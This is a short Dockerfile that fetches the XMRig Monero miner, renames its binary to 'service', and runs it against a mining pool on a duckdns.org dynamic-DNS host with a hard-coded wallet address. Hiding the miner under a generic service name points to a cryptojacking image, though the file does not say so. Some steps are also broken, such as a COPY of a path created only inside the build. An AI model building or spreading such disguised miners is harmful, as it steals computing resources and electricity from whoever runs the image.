FROM alpine:latest

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
RUN tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
RUN cd xmrig-6.20.0
RUN mv xmrig-6.20.0/xmrig xmrig-6.20.0/service

RUN mkdir -p /usr/local/bin/service
COPY xmrig-6.20.0/service /usr/local/bin/service
RUN chmod +x /usr/local/bin/service

WORKDIR /usr/local/bin/service

ENV WALLET=ZEPHYR2TFLiNGW2zGrJrbc43kdT9Vmx5ugKGBHHoZ4oxeS7X3X1xqEb5NCXjVNfAXthHHWQ8cd6XfcGYsLVgYRuK5642R48cXRH4Z
ENV POOL=imboost.duckdns.org:1123
ENV WORKER_NAME=x

CMD ["sh", "-c", "./service --url=$POOL --donate-level=1 --user=$WALLET --pass=$WORKER_NAME -k --algo=rx/0"]
